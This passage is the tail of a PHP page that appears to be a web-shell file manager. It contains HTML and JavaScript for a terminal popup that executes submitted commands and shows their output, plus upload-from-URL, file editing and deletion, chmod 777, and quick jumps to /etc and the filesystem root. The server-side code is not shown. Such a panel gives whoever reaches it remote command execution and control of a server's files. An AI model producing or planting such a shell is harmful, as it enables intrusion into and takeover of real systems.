                      <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete folder <?=esc($f)?> and all contents?')">🗑</button>
                    </form>
                  <?php else: ?>
                    <a href="<?=esc($p)?>" download style="text-decoration:none"><button class="action-btn" type="button">⬇ DL</button></a>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="view_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="margin-left:6px">✏️ Edit</button>
                    </form>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="del_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete file <?=esc($f)?>?')">🗑</button>
                    </form>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
          <!-- Hidden fields for bulk actions -->
          <input type="hidden" id="bulkActionField" name="bulk_action" value="">
          <input type="hidden" id="chmodValueField" name="chmod_value" value="">
          <input type="hidden" id="moveDestField" name="move_dest" value="">
          <input type="hidden" id="copyDestField" name="copy_dest" value="">
          <input type="hidden" id="renamePrefixField" name="rename_prefix" value="">
          <input type="hidden" id="renameSuffixField" name="rename_suffix" value="">
        </form>
      </div>
    </div>
  </div>
</div>

<!-- ==================== POPUPS ==================== -->

<!-- Editor Popup (Top Position) -->
<?php if (isset($_GET['show_editor']) && isset($_SESSION['edit_file_path'])): ?>
<div class="editor-popup-overlay" id="editorPopup">
  <div class="editor-popup-content">
    <div class="popup-header">
      <h4>✏️ Editing: <?=esc(basename($_SESSION['edit_file_path']))?></h4>
      <a href="?dir=<?=urlencode(dirname($_SESSION['edit_file_path']))?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <form method="POST">
        <textarea name="file_content" class="editor-textarea"><?=esc($_SESSION['file_content'] ?? '')?></textarea>
        <input type="hidden" name="save_file_path" value="<?=esc($_SESSION['edit_file_path'])?>">
        <div style="display:flex;gap:8px;justify-content:flex-end">
          <button class="btn-neon" name="save_file" type="submit">💾 Save File</button>
          <a href="?dir=<?=urlencode(dirname($_SESSION['edit_file_path']))?>" style="text-decoration:none">
            <button type="button" class="action-btn" style="background:linear-gradient(90deg,#222,#061023);color:var(--neon-cyan)">← Back</button>
          </a>
        </div>
      </form>
    </div>
  </div>
</div>
<?php 
unset($_SESSION['edit_file_path']);
unset($_SESSION['file_content']);
endif; ?>

<!-- File Upload Popup -->
<?php if (isset($_GET['show_file_upload'])): ?>
<div class="popup-overlay" id="fileUploadPopup">
  <div class="popup-content" style="width:500px">
    <div class="popup-header">
      <h4>⬆️ Upload Files</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <p style="margin:0 0 12px 0;color:var(--muted);font-size:13px">
        Upload files to current directory:
      </p>
      
      <form method="POST" enctype="multipart/form-data">
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Select Files</label>
          <input type="file" name="upload[]" class="input" multiple required>
        </div>
        
        <button type="submit" class="btn-neon" style="width:100%">Upload Files</button>
      </form>
      
      <div style="margin-top:12px;padding:10px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan);font-size:13px">Current Directory:</strong>
        <div style="margin-top:4px;font-size:12px;color:var(--muted)">
          <?=esc($dir)?>
        </div>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Bulk Operations Popup -->
<?php if (isset($_GET['show_bulk_ops'])): ?>
<div class="popup-overlay" id="bulkOpsPopup">
  <div class="popup-content" style="width:600px">
    <div class="popup-header">
      <h4>📦 Bulk Operations</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <p style="margin:0 0 12px 0;color:var(--muted);font-size:13px">
        Select files using checkboxes, then choose an action:
      </p>
      
      <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:12px">
        <button class="action-btn" onclick="bulkActionPopup('delete')" style="background:linear-gradient(90deg,#ff5f7a,#ff9fb4)">
          🗑 Delete
        </button>
        <button class="action-btn" onclick="bulkActionPopup('zip')">
          📦 Create Zip
        </button>
        <button class="action-btn" onclick="bulkActionPopup('unzip')">
          📂 Unzip Files
        </button>
        <button class="action-btn" onclick="showChmodPopup()">
          🔒 Permissions
        </button>
        <button class="action-btn" onclick="showMovePopup()">
          📂 Move
        </button>
        <button class="action-btn" onclick="showCopyPopup()">
          📋 Copy
        </button>
        <button class="action-btn" onclick="showRenamePopup()">
          ✏️ Rename
        </button>
        <button class="action-btn" onclick="selectAllFiles()">
          ✅ Select All
        </button>
        <button class="action-btn" onclick="clearSelection()" style="background:linear-gradient(90deg,#666,#999)">
          ✕ Clear All
        </button>
      </div>
      
      <!-- Chmod Section -->
      <div id="chmodSection" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Set Permissions:</strong>
        <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap">
          <button type="button" class="action-btn" onclick="setChmod('644')" style="font-size:12px">644</button>
          <button type="button" class="action-btn" onclick="setChmod('755')" style="font-size:12px">755</button>
          <button type="button" class="action-btn" onclick="setChmod('777')" style="font-size:12px">777</button>
          <button type="button" class="action-btn" onclick="setChmod('600')" style="font-size:12px">600</button>
        </div>
        <div class="popup-form" style="margin-top:8px">
          <input type="text" id="customChmod" class="input" placeholder="e.g., 755" pattern="[0-7]{3}">
          <button type="button" class="btn-neon" onclick="setCustomChmod()">Apply</button>
        </div>
      </div>
      
      <!-- Move Section -->
      <div id="moveSection" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Move to Directory:</strong>
        <div class="popup-form">
          <input type="text" id="moveDest" class="input" placeholder="/path/to/destination" value="<?=esc($dir)?>">
          <button type="button" class="btn-neon" onclick="executeMove()">Move</button>
        </div>
      </div>
      
      <!-- Copy Section -->
      <div id="copySection" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Copy to Directory:</strong>
        <div class="popup-form">
          <input type="text" id="copyDest" class="input" placeholder="/path/to/destination" value="<?=esc($dir)?>">
          <button type="button" class="btn-neon" onclick="executeCopy()">Copy</button>
        </div>
      </div>
      
      <!-- Rename Section -->
      <div id="renameSection" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Rename Files:</strong>
        <div style="display:flex;gap:8px;margin-top:8px">
          <div style="flex:1">
            <label style="font-size:12px;color:var(--muted)">Add Prefix:</label>
            <input type="text" id="renamePrefix" class="input" placeholder="prefix_" style="margin-top:4px">
          </div>
          <div style="flex:1">
            <label style="font-size:12px;color:var(--muted)">Add Suffix:</label>
            <input type="text" id="renameSuffix" class="input" placeholder="_suffix" style="margin-top:4px">
          </div>
        </div>
        <div style="margin-top:8px;font-size:12px;color:var(--muted)">
          Example: file.txt → <span id="renameExample">file.txt</span>
        </div>
        <button type="button" class="btn-neon" style="margin-top:8px" onclick="executeRename()">Rename Files</button>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- URL Upload Popup -->
<?php if (isset($_GET['show_url_upload'])): ?>
<div class="popup-overlay" id="urlUploadPopup">
  <div class="popup-content" style="width:500px">
    <div class="popup-header">
      <h4>🌐 Upload from URL</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <form method="POST">
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">File URL</label>
          <input type="text" name="url_upload" class="input" placeholder="https://example.com/file.zip" required>
        </div>
        
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">
            Custom Filename (optional)
          </label>
          <input type="text" name="url_filename" class="input" placeholder="custom_name.zip">
        </div>
        
        <button type="submit" class="btn-neon" style="width:100%">Download File</button>
      </form>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Terminal Popup -->
<?php if (isset($_GET['show_terminal'])): ?>
<div class="popup-overlay" id="terminalPopup">
  <div class="popup-content" style="width:800px">
    <div class="popup-header">
      <h4>💻 Terminal</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <form method="POST">
        <div style="display:flex;gap:8px;margin-bottom:12px">
          <input type="text" name="terminal_cmd" class="input" placeholder="Enter command..." style="flex:1" autofocus>
          <button class="btn-neon" type="submit">Execute</button>
        </div>
      </form>
      
      <?php if($terminal_output !== ''): ?>
      <div style="margin-top:12px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Output:</strong>
        <pre style="margin-top:8px;color:#e6eef8;font-family:monospace;font-size:12px;max-height:300px;overflow:auto"><?=esc($terminal_output)?></pre>
      </div>
      <?php endif; ?>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Quick Jump Popup -->
<?php if (isset($_GET['show_quick_jump'])): ?>
<div class="popup-overlay" id="quickJumpPopup">
  <div class="popup-content">
    <div class="popup-header">
      <h4>🚀 Quick Jump</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:12px">
        <a href="?dir=/" style="text-decoration:none"><button class="action-btn" style="width:100%">📁 Root</button></a>
        <a href="?dir=/home" style="text-decoration:none"><button class="action-btn" style="width:100%">🏠 /home</button></a>
        <a href="?dir=/var/www" style="text-decoration:none"><button class="action-btn" style="width:100%">🌐 /var/www</button></a>
        <a href="?dir=/tmp" style="text-decoration:none"><button class="action-btn" style="width:100%">📦 /tmp</button></a>
        <a href="?dir=/etc" style="text-decoration:none"><button class="action-btn" style="width:100%">⚙️ /etc</button></a>
        <a href="?dir=<?=esc(__DIR__)?>" style="text-decoration:none"><button class="action-btn" style="width:100%">📂 Script</button></a>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Server Info Modal -->
<?php if ($show_server_info): ?>
<div class="popup-overlay" id="serverInfoModal">
  <div class="popup-content">
    <div class="popup-header">
      <h4>🖥️ Server Info</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <table style="width:100%">
        <tr><td><strong>PHP Version</strong></td><td><?=esc(PHP_VERSION)?></td></tr>
        <tr><td><strong>Server OS</strong></td><td><?=esc(PHP_OS)?></td></tr>
        <tr><td><strong>Memory Limit</strong></td><td><?=esc(ini_get('memory_limit'))?></td></tr>
        <tr><td><strong>IP Address</strong></td><td><?=esc($_SERVER['REMOTE_ADDR']??'N/A')?></td></tr>
      </table>
    </div>
  </div>
</div>
<?php endif; ?>

<script>
// Bulk Operations Functions
let selectedFiles = new Set();

function toggleAllSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox:not(.bulk-select-all)');
    const selectAll = document.getElementById('selectAll');
    const allChecked = selectAll.checked;
    
    checkboxes.forEach(cb => {
        cb.checked = allChecked;
        if(allChecked) selectedFiles.add(cb.value);
        else selectedFiles.delete(cb.value);
    });
    
    updateBulkSelection();
}

function updateBulkSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox:not(.bulk-select-all)');
    selectedFiles.clear();
    
    checkboxes.forEach(cb => {
        if(cb.checked) selectedFiles.add(cb.value);
    });
    
    const selectedCount = selectedFiles.size;
    const bulkBar = document.getElementById('bulkActionsBar');
    const countSpan = document.getElementById('selectedCount');
    const selectAll = document.getElementById('selectAll');
    
    if(selectedCount > 0) {
        bulkBar.style.display = 'flex';
        countSpan.textContent = selectedCount + ' selected';
        selectAll.checked = checkboxes.length === selectedCount;
    } else {
        bulkBar.style.display = 'none';
        selectAll.checked = false;
    }
}

function clearSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox');
    checkboxes.forEach(cb => cb.checked = false);
    selectedFiles.clear();
    updateBulkSelection();
}

function bulkAction(action) {
    if(selectedFiles.size === 0) {
        alert('Please select files first!');
        return;
    }
    
    if(action === 'delete' && !confirm(`Delete ${selectedFiles.size} selected item(s)?`)) return;
    if(action === 'zip' && !confirm(`Create ZIP archive of ${selectedFiles.size} file(s)?`)) return;
    if(action === 'unzip') {
        const zipFiles = Array.from(selectedFiles).filter(f => f.toLowerCase().endsWith('.zip'));
        if(zipFiles.length === 0) {
            alert('No ZIP files selected.');
            return;
        }
        if(!confirm(`Unzip ${zipFiles.length} ZIP file(s)?`)) return;
    }
    
    if(action === 'chmod') {
        const chmod = prompt('Enter permissions (e.g., 755):', '644');
        if(chmod && /^[0-7]{3}$/.test(chmod)) {
            document.getElementById('chmodValueField').value = chmod;
            document.getElementById('bulkActionField').value = action;
            document.getElementById('bulkForm').submit();
        }
        return;
    }
    
    if(action === 'move') {
        const dest = prompt('Enter destination directory:', '<?=esc($dir)?>');
        if(dest) {
            document.getElementById('moveDestField').value = dest;
            document.getElementById('bulkActionField').value = action;
            document.getElementById('bulkForm').submit();
        }
        return;
    }
    
    if(action === 'copy') {
        const dest = prompt('Enter destination directory:', '<?=esc($dir)?>');
        if(dest) {
            document.getElementById('copyDestField').value = dest;
            document.getElementById('bulkActionField').value = action;
            document.getElementById('bulkForm').submit();
        }
        return;
    }
    
    if(action === 'rename') {
        const prefix = prompt('Add prefix (leave empty for none):', '');
        const suffix = prompt('Add suffix (leave empty for none):', '');
        if(prefix !== null && suffix !== null) {
            document.getElementById('renamePrefixField').value = prefix || '';
            document.getElementById('renameSuffixField').value = suffix || '';
            document.getElementById('bulkActionField').value = action;
            document.getElementById('bulkForm').submit();
        }
        return;
    }
    
    document.getElementById('bulkActionField').value = action;
    document.getElementById('bulkForm').submit();
}

// Popup Functions
function bulkActionPopup(action) {
    if(selectedFiles.size === 0) {
        alert('Please select files first!');
        return;
    }
    
    if(action === 'delete' && !confirm(`Delete ${selectedFiles.size} selected item(s)?`)) return;
    if(action === 'zip' && !confirm(`Create ZIP archive of ${selectedFiles.size} file(s)?`)) return;
    if(action === 'unzip') {
        const zipFiles = Array.from(selectedFiles).filter(f => f.toLowerCase().endsWith('.zip'));
        if(zipFiles.length === 0) {
            alert('No ZIP files selected.');
            return;
        }
        if(!confirm(`Unzip ${zipFiles.length} ZIP file(s)?`)) return;
    }
    
    document.getElementById('bulkActionField').value = action;
    document.getElementById('bulkForm').submit();
}

function showChmodPopup() {
    document.getElementById('chmodSection').style.display = 'block';
    document.getElementById('moveSection').style.display = 'none';
    document.getElementById('copySection').style.display = 'none';
    document.getElementById('renameSection').style.display = 'none';
}

function showMovePopup() {
    document.getElementById('moveSection').style.display = 'block';
    document.getElementById('chmodSection').style.display = 'none';
    document.getElementById('copySection').style.display = 'none';
    document.getElementById('renameSection').style.display = 'none';
}

function showCopyPopup() {
    document.getElementById('copySection').style.display = 'block';
    document.getElementById('chmodSection').style.display = 'none';
    document.getElementById('moveSection').style.display = 'none';
    document.getElementById('renameSection').style.display = 'none';
}

function showRenamePopup() {
    document.getElementById('renameSection').style.display = 'block';
    document.getElementById('chmodSection').style.display = 'none';
    document.getElementById('moveSection').style.display = 'none';
    document.getElementById('copySection').style.display = 'none';
    updateRenameExample();
    document.getElementById('renamePrefix').addEventListener('input', updateRenameExample);
    document.getElementById('renameSuffix').addEventListener('input', updateRenameExample);
}

function updateRenameExample() {
    const prefix = document.getElementById('renamePrefix').value || '';
    const suffix = document.getElementById('renameSuffix').value || '';
    document.getElementById('renameExample').textContent = prefix + 'file.txt' + suffix;
}

function setChmod(value) {
    document.getElementById('customChmod').value = value;
    setCustomChmod();
}

function setCustomChmod() {
    const chmod = document.getElementById('customChmod').value;
    if(!/^[0-7]{3}$/.test(chmod)) {
        alert('Invalid permission format. Use 3 digits (0-7).');
        return;
    }
    document.getElementById('chmodValueField').value = chmod;
    document.getElementById('bulkActionField').value = 'chmod';
    document.getElementById('bulkForm').submit();
}

function executeMove() {
    const dest = document.getElementById('moveDest').value;
    if(!dest) {
        alert('Please enter destination directory');
        return;
    }
    document.getElementById('moveDestField').value = dest;
    document.getElementById('bulkActionField').value = 'move';
    document.getElementById('bulkForm').submit();
}

function executeCopy() {
    const dest = document.getElementById('copyDest').value;
    if(!dest) {
        alert('Please enter destination directory');
        return;
    }
    document.getElementById('copyDestField').value = dest;
    document.getElementById('bulkActionField').value = 'copy';
    document.getElementById('bulkForm').submit();
}

function executeRename() {
    const prefix = document.getElementById('renamePrefix').value || '';
    const suffix = document.getElementById('renameSuffix').value || '';
    
    if(prefix === '' && suffix === '') {
        alert('Please enter either a prefix or suffix.');
        return;
    }
    
    document.getElementById('renamePrefixField').value = prefix;
    document.getElementById('renameSuffixField').value = suffix;
    document.getElementById('bulkActionField').value = 'rename';
    document.getElementById('bulkForm').submit();
}

function selectAllFiles() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox');
    checkboxes.forEach(cb => cb.checked = true);
    updateBulkSelection();
}

// Notifications
function showNotifications() {
    const success = document.getElementById('uploadSuccess');
    const error = document.getElementById('uploadError');
    
    if(success) {
        success.style.display = 'block';
        setTimeout(() => success.style.display = 'none', 5000);
    }
    
    if(error) {
        error.style.display = 'block';
        setTimeout(() => error.style.display = 'none', 5000);
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    updateBulkSelection();
    showNotifications();
});
</script>
</body>
</html>